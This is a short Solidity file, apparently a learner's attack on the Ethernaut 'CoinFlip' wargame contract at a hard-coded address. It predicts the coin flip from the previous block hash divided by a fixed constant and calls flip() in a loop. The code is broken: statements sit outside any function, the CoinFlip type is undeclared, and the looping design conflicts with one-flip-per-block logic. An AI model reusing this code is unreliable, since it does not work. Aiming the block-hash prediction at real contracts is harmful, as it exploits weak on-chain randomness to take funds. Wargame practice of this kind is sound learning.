pragma solidity ^0.4.18;

contract sinasEvilCoinFlip {
    address coinFlipAddress = 0xe52b49f31e106243026817f802bb9bbba49a70e7;

    // Ok so basically this is how you call other contracts that are deployed
    // Contract - visibility - name     = contract (contract address)
    CoinFlip public ethernaut_coin_flip = CoinFlip(coinFlipAddress);
    // name.function() for that contract 


    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    
    for(uint i = 0; i < 10; i++){
        
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ethernaut_coin_flip.flip(side);
    
    }

}